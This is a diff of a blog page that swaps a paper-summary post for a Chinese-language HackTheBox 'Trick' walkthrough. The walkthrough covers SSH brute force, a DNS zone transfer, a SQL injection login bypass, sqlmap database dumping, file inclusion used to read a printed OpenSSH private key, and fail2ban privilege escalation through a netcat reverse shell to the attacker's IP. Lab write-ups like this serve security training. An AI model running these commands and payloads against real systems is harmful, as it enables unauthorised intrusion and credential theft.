@@ -4,8 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="NXNSAttack:Recursive DNS Inefficiencies and Vulnerabilities, hackthebox,ctf,渗透">
-    <meta name="description" content="NXNSAttack: Recursive DNS Inefficiencies and Vulnerabilitieshttps://www.usenix.org/conference/usenixsecurity20/presentat">
+    <meta name="keywords" content="HTB-Trick, hackthebox,ctf,渗透">
+    <meta name="description" content="HTB-Trickip:10.10.11.166
+nmap -Pn -sS -v -p- 10.10.11.166
+
+
+爆破22端口失败
+hydra 10.10.11.166 ssh -l root -P /usr/share/wordli">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +22,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>NXNSAttack:Recursive DNS Inefficiencies and Vulnerabilities | l1b3r&#39;s blog</title>
+    <title>HTB-Trick | l1b3r&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -336,12 +341,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">NXNSAttack:Recursive DNS Inefficiencies and Vulnerabilities</h1>
+                    <h1 class="description center-align post-title">HTB-Trick</h1>
                 </div>
             </div>
         </div>
@@ -381,8 +386,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E8%AE%BA%E6%96%87/" class="post-category">
-                                论文
+                            <a href="/categories/HTB/" class="post-category">
+                                HTB
                             </a>
                         
                     </div>
@@ -394,7 +399,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-11-26
+                    2022-10-08
                 </div>
                 
 
@@ -418,12 +423,151 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>NXNSAttack: Recursive DNS Inefficiencies and Vulnerabilities<br><a target="_blank" rel="noopener" href="https://www.usenix.org/conference/usenixsecurity20/presentation/afek">https://www.usenix.org/conference/usenixsecurity20/presentation/afek</a></p>
-<span id="more"></span>
+                <h1 id="HTB-Trick"><a href="#HTB-Trick" class="headerlink" title="HTB-Trick"></a>HTB-Trick</h1><p>ip:10.10.11.166</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">nmap <span class="token operator">-</span><span class="token class-name">Pn</span> <span class="token operator">-</span>sS <span class="token operator">-</span>v <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.166</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-29_20.44.20.png" alt="截屏2022-08-29 20.44.20.png"></p>
+<p>爆破22端口失败</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">hydra <span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.166</span> ssh <span class="token operator">-</span>l root <span class="token operator">-</span><span class="token class-name">P</span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span>rockyou<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>gz <span class="token operator">-</span>t <span class="token number">6</span> <span class="token operator">-</span>v <span class="token operator">-</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>查看80端口，抓包看一下请求，没什么用</p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-29_20.45.07.png" alt="截屏2022-08-29 20.45.07.png"></p>
+<p>dig查看一下，发现preprod-payroll.trick.htb</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns">53 - Pentesting DNS</a></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">dig axfr trick<span class="token punctuation">.</span>htb <span class="token annotation punctuation">@10.10.11.166</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_12.09.35.png" alt="截屏2022-08-31 12.09.35.png"></p>
+<p>Fuzz一下有没有其他子域名</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">ffuf <span class="token operator">-</span>u http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>trick<span class="token punctuation">.</span>htb <span class="token operator">-</span>w <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span><span class="token class-name">SecLists</span><span class="token operator">/</span><span class="token class-name">Discovery</span><span class="token operator">/</span><span class="token constant">DNS</span><span class="token operator">/</span>subdomains<span class="token operator">-</span>top1million<span class="token operator">-</span><span class="token number">5000.</span>txt <span class="token operator">-</span><span class="token class-name">H</span> '<span class="token class-name">Host</span><span class="token operator">:</span> preprod<span class="token operator">-</span><span class="token constant">FUZZ</span><span class="token punctuation">.</span>trick<span class="token punctuation">.</span>htb' <span class="token operator">-</span>fw <span class="token number">1697</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.04.06.png" alt="截屏2022-08-31 21.04.06.png"></p>
+<p>发现一个preprod-marketing.trick.htb，添加到hosts</p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.04.56.png" alt="截屏2022-08-31 21.04.56.png"></p>
+<p>打开页面，只有一个登录窗口，尝试弱口令，未成功</p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_12.31.19.png" alt="截屏2022-08-31 12.31.19.png"></p>
+<p>尝试万能密码，成功进入后台</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">admin' or <span class="token class-name">True</span> <span class="token operator">--</span> <span class="token operator">-</span>
+admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_19.19.08.png" alt="截屏2022-08-31 19.19.08.png"></p>
+<p>在Users→Action→edit,使用F12大法可以看到密码：</p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_19.50.08.png" alt="截屏2022-08-31 19.50.08.png"></p>
+<p>在employee界面添加成员并抓包</p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_19.22.25.png" alt="截屏2022-08-31 19.22.25.png"></p>
+<p>抓包如下：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">POST</span> <span class="token operator">/</span>ajax<span class="token punctuation">.</span>php<span class="token operator">?</span>action<span class="token operator">=</span>save_employee <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> preprod<span class="token operator">-</span>payroll<span class="token punctuation">.</span>trick<span class="token punctuation">.</span>htb
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token constant">X11</span><span class="token punctuation">;</span> <span class="token class-name">Linux</span> x86_64<span class="token punctuation">;</span> rv<span class="token operator">:</span><span class="token number">91.0</span><span class="token punctuation">)</span> <span class="token class-name">Gecko</span><span class="token operator">/</span><span class="token number">20100101</span> <span class="token class-name">Firefox</span><span class="token operator">/</span><span class="token number">91.0</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> <span class="token operator">*</span><span class="token comment">/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 93
+Origin: http://preprod-payroll.trick.htb
+Connection: close
+Referer: http://preprod-payroll.trick.htb/index.php?page=employee
+Cookie: PHPSESSID=sge9952plnojhbr5qeobj5ggkv
+
+id=&amp;firstname=l1b3ri&amp;middlename=l1b3ri&amp;lastname=l1b3ri&amp;department_id=2&amp;position_id=2&amp;salary=2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>保存到trick.req，用sqlmap进行扫描尝试：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">--</span>dbs
+sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">-</span><span class="token class-name">D</span> payroll_db <span class="token operator">--</span>tables <span class="token operator">--</span>threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_19.45.57.png" alt="截屏2022-08-31 19.45.57.png"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">-</span><span class="token class-name">D</span> payroll_db <span class="token operator">--</span>tables <span class="token operator">--</span>threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_20.06.23.png" alt="截屏2022-08-31 20.06.23.png"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">-</span><span class="token class-name">D</span> payroll_db <span class="token operator">-</span><span class="token class-name">T</span> users <span class="token operator">--</span><span class="token class-name">Columns</span> <span class="token operator">--</span>threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_20.30.11.png" alt="截屏2022-08-31 20.30.11.png"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">-</span><span class="token class-name">D</span> payroll_db <span class="token operator">-</span><span class="token class-name">T</span> users <span class="token operator">-</span><span class="token class-name">C</span> name<span class="token punctuation">,</span>id<span class="token punctuation">,</span>password <span class="token operator">--</span>dump <span class="token operator">--</span>threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_20.34.48.png" alt="截屏2022-08-31 20.34.48.png"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">--</span>current<span class="token operator">-</span>user <span class="token operator">--</span>threads <span class="token number">10</span>
+current user<span class="token operator">:</span> 'remo<span class="token annotation punctuation">@localhost</span>’<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>尝试一下文件读取：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">--</span>file<span class="token operator">-</span>read<span class="token operator">=</span><span class="token operator">/</span>etc<span class="token operator">/</span>hostname <span class="token operator">--</span>threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这时候发现Users界面和Employee List界面的请求</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">?</span>page<span class="token operator">=</span>xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>猜测是否含有文件包含？抓包尝试</p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_19.56.25.png" alt="截屏2022-08-31 19.56.25.png"></p>
+<p>FUZZ一下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">wfuzz <span class="token operator">-</span>w <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span><span class="token class-name">Auto_Wordlists</span><span class="token operator">/</span>wordlists<span class="token operator">/</span>file_inclusion_linux<span class="token punctuation">.</span>txt <span class="token operator">-</span>b cookie<span class="token operator">=</span>sge9952plnojhbr5qeobj5ggkv  <span class="token string">"http://preprod-payroll.trick.htb/index.php?page=FUZZ"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_20.51.22.png" alt="截屏2022-08-31 20.51.22.png"></p>
+<p>失败</p>
+<p>尝试preprod-marketing.trick.htb</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>preprod<span class="token operator">-</span>marketing<span class="token punctuation">.</span>trick<span class="token punctuation">.</span>htb<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span>about<span class="token punctuation">.</span>html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>同样尝试fuzz有没有EFI</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">wfuzz <span class="token operator">-</span>w <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span><span class="token class-name">Auto_Wordlists</span><span class="token operator">/</span>wordlists<span class="token operator">/</span>file_inclusion_linux<span class="token punctuation">.</span>txt <span class="token operator">-</span>b cookie<span class="token operator">=</span>sge9952plnojhbr5qeobj5ggkv  <span class="token string">"http://preprod-marketing.trick.htb/index.php?page=FUZZ"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.09.29.png" alt="截屏2022-08-31 21.09.29.png"></p>
+<p>Successful！</p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.09.57.png" alt="截屏2022-08-31 21.09.57.png"></p>
+<p>读一下ssh文件</p>
+<p>保存到trick_michael.pri</p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.11.46.png" alt="截屏2022-08-31 21.11.46.png"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">BEGIN</span> <span class="token constant">OPENSSH</span> <span class="token constant">PRIVATE</span> <span class="token constant">KEY</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+<span class="token class-name">NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2</span><span class="token operator">/</span><span class="token operator">+</span><span class="token number">7</span>mgg5HpSwzHZwu95Nqh1Gu4<span class="token operator">+</span><span class="token number">9</span>P<span class="token operator">+</span>ohLtz
+c4jtky6wYGzlxKHg<span class="token operator">/</span><span class="token class-name">Q5ehozs9TgNWPVKh</span><span class="token operator">+</span>j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
+<span class="token class-name">YQ2re</span><span class="token operator">/</span>gTrNElMAqURSCVydx<span class="token operator">/</span><span class="token class-name">UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf</span><span class="token operator">+</span>
+<span class="token number">4</span>gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia<span class="token operator">/</span>
+<span class="token class-name">Ukn75SroKGUMdiJHnd</span><span class="token operator">+</span>m1jW5mGotQRxkATWMY5qFOiKglnws<span class="token operator">/</span>jgdxpDV9K3iDTPWXFwtK4
+<span class="token number">1</span>kC<span class="token operator">+</span>t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo<span class="token operator">+</span><span class="token number">3</span>b<span class="token operator">/</span><span class="token number">7</span>uaC
+<span class="token class-name">DkelLDMdnC73k2qHUa7j70</span><span class="token operator">/</span><span class="token number">6</span>iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+<span class="token operator">+</span><span class="token number">93</span>NpCpgrHDgXB3crsXgmydlomTYZhDat7<span class="token operator">+</span><span class="token class-name">BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE</span>
+hkXgenBG3VPvjCKiohfcQBgIJlx<span class="token operator">/</span><span class="token number">7</span>iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
+jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
+<span class="token class-name">IqCWfCz</span><span class="token operator">+</span><span class="token class-name">OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri</span><span class="token operator">/</span>dldDc3C
+aUZ9JF9u<span class="token operator">/</span>cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf<span class="token operator">+</span><span class="token class-name">IBKa3bCuNffp4ulSt2T</span><span class="token operator">/</span>mQYlmi<span class="token operator">/</span>
+<span class="token class-name">KwkWcvbR2gTOlpgLZNRE</span><span class="token operator">/</span><span class="token class-name">GgtEd32QfrL</span><span class="token operator">+</span>hPGn3CZdujgD<span class="token operator">+</span><span class="token number">5</span>aP6L9k75t0aBWMR7ru7EYjC
+tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
+<span class="token class-name">U</span><span class="token operator">+</span><span class="token number">38</span>O714987fRe4<span class="token operator">+</span>jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS<span class="token operator">+</span>ouM0
+fHbE5GMyJf6<span class="token operator">+</span><span class="token operator">/</span><span class="token number">8</span>P06MbAdZ1<span class="token operator">+</span><span class="token number">5</span>nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
+<span class="token constant">PH</span><span class="token operator">+</span><span class="token number">7</span><span class="token operator">+</span><span class="token class-name">Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS</span>
+<span class="token number">3</span>AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS<span class="token operator">+</span><span class="token class-name">Nr3aFUTl3SxOxD7T4tKXA</span>
+fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo<span class="token operator">+</span><span class="token number">5</span>KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
+<span class="token class-name">AuNHUSgX</span><span class="token operator">/</span>tcNxg1yYHeHTu868<span class="token operator">/</span><span class="token class-name">LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn</span>
+<span class="token class-name">In16n3kMFSFaU2bCkzaLGQ</span><span class="token operator">+</span>hoD5QJXeVMt6a<span class="token operator">/</span><span class="token number">5</span>ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
+<span class="token class-name">JkCbANS5fRVNVi0Lx</span><span class="token operator">+</span><span class="token class-name">BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ</span><span class="token operator">/</span><span class="token class-name">YzySvfVNPtSb0XN</span>
+jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4<span class="token operator">+</span><span class="token constant">YGGH</span><span class="token operator">+</span>mka7P<span class="token operator">+</span><span class="token class-name">VVfvJDZa67XNHzrxi</span><span class="token operator">+</span>
+<span class="token class-name">IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ</span><span class="token operator">==</span>
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">END</span> <span class="token constant">OPENSSH</span> <span class="token constant">PRIVATE</span> <span class="token constant">KEY</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.26.55.png" alt="截屏2022-08-31 21.26.55.png"></p>
+<p>linpeas扫一下</p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.29.36.png" alt="截屏2022-08-31 21.29.36.png"></p>
+<p>第一部分flag</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">280503</span>ef44e47dc5d1f7c402eb65009f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>尝试了几个提权都失败了</p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.45.15.png" alt="截屏2022-08-31 21.45.15.png"></p>
+<p><a target="_blank" rel="noopener" href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">Abusing Fail2ban misconfiguration to escalate privileges on Linux</a></p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.56.10.png" alt="截屏2022-08-31 21.56.10.png"></p>
+<p>可以看到action.d具有写权限，文章中提示需要将iptables-multiport.conf文件进行复制修改</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">vim iptables<span class="token operator">-</span>multiport<span class="token punctuation">.</span>conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_22.03.07.png" alt="截屏2022-08-31 22.03.07.png"></p>
+<p>修改</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>nc <span class="token number">10.10</span><span class="token number">.16</span><span class="token number">.23</span> <span class="token number">1337</span> <span class="token operator">-</span>e <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_22.09.12.png" alt="截屏2022-08-31 22.09.12.png"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">mv iptables<span class="token operator">-</span>multiport<span class="token punctuation">.</span>conf <span class="token operator">/</span>etc<span class="token operator">/</span>fail2ban<span class="token operator">/</span>action<span class="token punctuation">.</span>d<span class="token operator">/</span>
+tail <span class="token operator">-</span>n <span class="token number">20</span> <span class="token operator">/</span>etc<span class="token operator">/</span>fail2ban<span class="token operator">/</span>action<span class="token punctuation">.</span>d<span class="token operator">/</span>iptables<span class="token operator">-</span>multiport<span class="token punctuation">.</span>conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_22.16.12.png" alt="截屏2022-08-31 22.16.12.png"></p>
+<p>通过ssh链接失败来触发</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">patator ssh_login host<span class="token operator">=</span>trick user<span class="token operator">=</span><span class="token class-name">FILE0</span> password<span class="token operator">=</span><span class="token class-name">FILE1</span> <span class="token number">0</span><span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span><span class="token class-name">SecLists</span><span class="token operator">/</span><span class="token class-name">Usernames</span><span class="token operator">/</span><span class="token class-name">Names</span><span class="token operator">/</span>familynames<span class="token operator">-</span>usa<span class="token operator">-</span>top1000<span class="token punctuation">.</span>txt <span class="token number">1</span><span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span><span class="token class-name">SecLists</span><span class="token operator">/</span><span class="token class-name">Passwords</span><span class="token operator">/</span><span class="token number">500</span><span class="token operator">-</span>worst<span class="token operator">-</span>passwords<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>连接成功</p>
+<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_22.49.37.png" alt="截屏2022-08-31 22.49.37.png"></p>
 
                 
             </div>
@@ -450,7 +594,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://l1b3r.github.io/2021/11/26/nxnsattack/">https://l1b3r.github.io/2021/11/26/nxnsattack/</a>
+                    <a href="https://l1b3r.github.io/2022/10/08/htb-trick/">https://l1b3r.github.io/2022/10/08/htb-trick/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -572,42 +716,43 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/11/26/vulhub/">
+                <a href="/2022/10/08/htb-trick/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Vulhub解题，每日一题">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="HTB-Trick">
                         
-                        <span class="card-title">Vulhub解题，每日一题</span>
+                        <span class="card-title">HTB-Trick</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            1.S2-001 远程代码执行漏洞
-该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前
+                            
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-08
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Vulhub/" class="post-category">
-                                    Vulhub
+                            <a href="/categories/HTB/" class="post-category">
+                                    HTB
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -627,41 +772,40 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/11/26/nxnsattack/">
+                <a href="/2022/10/08/http-request-smuggling/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="NXNSAttack:Recursive DNS Inefficiencies and Vulnerabilities">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="HTTP-request-smuggling">
                         
-                        <span class="card-title">NXNSAttack:Recursive DNS Inefficiencies and Vulnerabilities</span>
+                        <span class="card-title">HTTP-request-smuggling</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            NXNSAttack: Recursive DNS Inefficiencies and Vulnerabilitieshttps://www.usenix.org/conference/usenixsecurity20/presentat
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-08
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E8%AE%BA%E6%96%87/" class="post-category">
-                                    论文
+                            <a href="/categories/Web/" class="post-category">
+                                    Web
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
